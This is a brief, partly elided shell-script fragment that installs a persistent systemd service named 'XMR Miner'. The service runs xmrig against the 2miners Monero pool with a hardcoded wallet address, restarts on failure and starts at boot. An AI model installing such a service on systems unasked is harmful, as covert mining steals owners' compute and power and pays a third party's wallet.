...
then
	...
	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
        ...
        sudo bash -c 'echo -e "[Unit]\nDescription=XMR Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/xmrig-6.18.1/xmrig -o xmr.2miners.com:2222 --rig-id=TamCris -u 89gVART9CrabYxYV8QunNxbUHfZNp1EtcAzML4sXvCafKdJAHJGZFYWJY1YxM1Yc5ZAUfKFUkhiiJShLZJ8VdPcRB2AwXKG -p x -k &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/xmr.service'
